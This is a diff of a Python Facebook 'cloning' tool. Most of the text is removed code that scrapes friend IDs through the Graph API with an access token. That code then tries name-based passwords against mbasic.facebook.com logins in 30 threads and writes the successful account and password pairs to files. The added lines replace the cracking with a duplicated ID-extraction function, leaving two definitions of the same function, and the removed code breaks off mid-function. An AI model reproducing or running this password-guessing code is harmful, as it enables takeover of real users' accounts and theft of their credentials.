@@ -57,6 +57,8 @@ _______________\:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::|    ||:::|
 """
 dec="2"
 server="2"
+dec="2"
+server="2"
 
 
 rsauser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
@@ -169,8 +171,7 @@ def main_input():
         time.sleep(5)
         mx("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
         time.sleep(2)
-			
-			
+ 			
     elif mx=='7':
         os.system("xdg-open https://wa.me/+923188214452")
         time.sleep(3)
@@ -181,7 +182,6 @@ def main_input():
         print ('invild option')
         time.sleep(2)
         main()
-
 
 def numcloning():
     if dec in server:
@@ -396,8 +396,7 @@ def fb_menu():
         mineExt()
     else:
         fb_menu()
-
-
+  
 def mineExt():
     global token
     hok=('jok.txt')
@@ -689,10 +688,8 @@ def mineExt():
 
 
 
-
-
-def xokpauto():
-    os.system("rm -rf kk.txt")
+def mineExt():
+    global token
     hok=('jok.txt')
     count=[]
     rana=[]
@@ -717,10 +714,13 @@ def xokpauto():
         fuck.write(uid + '|' + na + '\n')
     fuck.close()
     print ("")
-    print (sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends")
+    print (sm+"[=] Extracting From : "+nid+" > \x1b[1;91mFriends")
     print ("")
     time.sleep(2)
-    print (g+"[=] Transfer Complte Process Start *"+w)
+    print (gu+"[=] Graping URLs ......"+w)
+    print ("")
+    time.sleep(2)
+    print (g+"[=] Graping Complte Process Start *"+w)
     print ("")
     os.system(' cat look.txt | grep "10000" >> kk.txt')
     os.system(' cat look.txt | grep "1000" >> kk.txt')
@@ -728,7 +728,7 @@ def xokpauto():
     file=open('kk.txt')
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -740,7 +740,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -752,7 +752,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -764,7 +764,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -776,7 +776,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -788,7 +788,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -800,7 +800,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -812,7 +812,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -824,7 +824,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -836,7 +836,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -848,7 +848,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -860,7 +860,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -872,7 +872,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -884,7 +884,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -896,7 +896,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -908,7 +908,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -920,7 +920,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -932,7 +932,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -944,7 +944,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -956,7 +956,7 @@ def xokpauto():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
+    print (g+"[=] Extracting From RK : "+my_line[:15])
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck=open("jok.txt",'a')
@@ -966,993 +966,15 @@ def xokpauto():
         rana.append(uid + '|' + na)
         fuck.write(uid + '|' + na + '\n')
     fuck.close()
-    os.system('rm -rf newlinks.txt')
-    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
-    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
-    os.system('rm -rf kk.txt')
+    print ("")
+    print ("")
+    print (sm+"[=] Total Extract ids : "+str(len(count))+w)
+    print ("")
+    mvt=raw_input("[=] Enter Path To Save File : ")
+    print ("[=] Your File Save in : "+mvt)
+    shutil.move(hok,mvt)
     os.system('rm -rf jok.txt')
-    os.system('clear')
-    print (logo)
-    print ("")
-    try:
-        for line in open("newlinks.txt",'r').readlines():
-            idx.append(line.strip())
-    except:
-        fb_menu()
-    print ("[!] total ids : "+str(len(idx)))
-    os.system('echo " -----------------------------------"| lolcat')
-    print ("    cracking start please wait ..   ")
-    os.system('echo " -----------------------------------"| lolcat')
-    def main(arg):
-        user=arg
-        uid, name = user.split("|")
-        name=name.lower()
-        first = name.rsplit(' ')[0]
-        try:
-            last = name.rsplit(' ')[1]
-        except:
-            pass
-        myagents=random.choice(["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8", "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"])
-        try:
-            pass1 = name
-            rana = requests.Session()
-            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-            p = rana.get('https://mbasic.facebook.com')
-            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
-            if 'c_user' in rana.cookies.get_dict().keys():
-                print ("\x1b[1;92m[RSA-OK] "+uid + " | " + pass1)
-                ok=open('rsa-ok.txt', 'a')
-                ok.write(uid+ " | " +pass1+ "\n")
-                ok.close()
-                oks.append(uid+pass1)
-            else:
-                if 'checkpoint' in rana.cookies.get_dict().keys():
-                    print ("\x1b[1;97m[RSA-CP] "+uid + " | " + pass1)
-                    cp=open('rsa-cp.txt', 'a')
-                    cp.write(uid+ " | " +pass1+ "\n")
-                    cp.close()
-                    cps.append(uid+pass1)
-                else:
-                    pass2 = first+"123"
-                    rana = requests.Session()
-                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                    p = rana.get('https://mbasic.facebook.com')
-                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
-                    if 'c_user' in rana.cookies.get_dict().keys():
-                        print ("\x1b[1;92m[RSA-OK] "+uid + " | " + pass2)
-                        ok=open('rsa-ok.txt', 'a')
-                        ok.write(uid+ " | " +pass2+ "\n")
-                        ok.close()
-                        oks.append(uid+pass2)
-                    else:
-                        if 'checkpoint' in rana.cookies.get_dict().keys():
-                            print ("\x1b[1;97m[RSA-CP] "+uid + " | " + pass2)
-                            cp=open('rsa-cp.txt', 'a')
-                            cp.write(uid+ " | " +pass2+ "\n")
-                            cp.close()
-                            cps.append(uid+pass2)
-                        else:
-                            pass3 = first+"1234"
-                            rana = requests.Session()
-                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                            p = rana.get('https://mbasic.facebook.com')
-                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
-                            if 'c_user' in rana.cookies.get_dict().keys():
-                                print ("\x1b[1;92m[RSA-OK] "+uid + " | " + pass3) 
-                                ok=open('rsa-ok.txt', 'a')
-                                ok.write(uid+ " | " +pass3+ "\n")
-                                ok.close()
-                                oks.append(uid+pass3)
-                            else:
-                                if 'checkpoint' in rana.cookies.get_dict().keys():
-                                    print ("\x1b[1;97m[RSA-CP] "+uid + " | " + pass3)
-                                    cp=open('rsa-cp.txt', 'a')
-                                    cp.write(uid+ " | " +pass3+ "\n")
-                                    cp.close()
-                                    cps.append(uid+pass3)
-                                else:
-                                    pass4 = first+"12345"
-                                    rana = requests.Session()
-                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                                    p = rana.get('https://mbasic.facebook.com')
-                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
-                                    if 'c_user' in rana.cookies.get_dict().keys():
-                                        print ("\x1b[1;92m[RSA-OK] "+uid + " | " + pass4)
-                                        ok=open('rsa-ok.txt', 'a')
-                                        ok.write(uid+ " | " +pass4+ "\n")
-                                        ok.close()
-                                        oks.append(uid+pass4)
-                                    else:
-                                        if 'checkpoint' in rana.cookies.get_dict().keys():
-                                            print ("\x1b[1;97m[RSA-CP] "+uid + " | " + pass4)
-                                            cp=open('rsa-cp.txt', 'a')
-                                            cp.write(uid+ " | " +pass4+ "\n")
-                                            cp.close()
-                                            cps.append(uid+pass4)
-                                        else:
-                                            pass5 = last+"123"
-                                            rana = requests.Session()
-                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                                            p = rana.get('https://mbasic.facebook.com')
-                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
-                                            if 'c_user' in rana.cookies.get_dict().keys():
-                                                print ("\x1b[1;92m[RSA-OK] "+uid + " | " + pass5)
-                                                ok=open('rsa-ok.txt', 'a')
-                                                ok.write(uid+ " | " +pass5+ "\n")
-                                                ok.close()
-                                                oks.append(uid+pass5)
-                                            else:
-                                                if 'checkpoint' in rana.cookies.get_dict().keys():
-                                                    print ("\x1b[1;97m[RSA-CP] "+uid + " | " + pass5)
-                                                    cp=open('rsa-cp.txt', 'a')
-                                                    cp.write(uid+ " | " +pass5+ "\n")
-                                                    cp.close()
-                                                    cps.append(uid+pass5)
-                            
-                    
-        except:
-            pass
-    
-    p = ThreadPool(30)
-    p.map(main, idx)
-    print ("\x1b[1;97m")
-    print (39*'-')
-    print ("[!] cloning complete result ........")
-    print (39*'-')
-    print ('[!] total ok ids : '+str(len(oks)))
-    print ('[!] total cp ids : '+str(len(cps)))
-    print (39*'-')
-    print ('')
-    raw_input(' Press enter to back ')
-    fb_menu()
-    
-def xokp():
-    hok=('jok.txt')
-    count=[]
-    rana=[]
-    try:
-        token=open('token.txt','r').read()
-    except:
-        fb_menu()
-    os.system('clear')
-    print (logo)
-    print ("")
-    iiid=raw_input("[1] Enter ID : ")
-    print ("")
-    ps1=raw_input('[1] Password : ')
-    ps2=raw_input('[2] Password : ')
-    ps3=raw_input('[3] Password : ')
-    ps4=raw_input('[4] Password : ')
-    print ("")
-    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
-    q=json.loads(rrp.text)
-    nid=q ['name']
-    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("look.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    print ("")
-    print (sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends")
-    print ("")
-    time.sleep(2)
-    print (g+"[=] Transfer Complte Process Start *"+w)
-    print ("")
-    os.system(' cat look.txt | grep "10000" >> kk.txt')
-    os.system(' cat look.txt | grep "1000" >> kk.txt')
-    os.system('rm -rf look.txt')
-    file=open('kk.txt')
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    os.system('rm -rf newlinks.txt')
-    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
-    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
-    os.system('rm -rf kk.txt')
-    os.system('rm -rf jok.txt')
-    os.system('clear')
-    print (logo)
-    print ("")
-    try:
-        for line in open("newlinks.txt",'r').readlines():
-            idx.append(line.strip())
-    except:
-        fb_menu()
-    print ("[!] Total Ids: "+str(len(idx)))
-    os.system('echo " -----------------------------------"| lolcat')
-    print ("    Cracking Start Please Wait ..   ")
-    print ("    Use Airplane Mod For Up Speed ")
-    os.system('echo " -----------------------------------"| lolcat')
-    def main(arg):
-        user=arg
-        uid, name = user.split("|")
-        name=name.lower()
-        first = name.rsplit(' ')[0]
-        try:
-            last = name.rsplit(' ')[1]
-        except:
-            pass
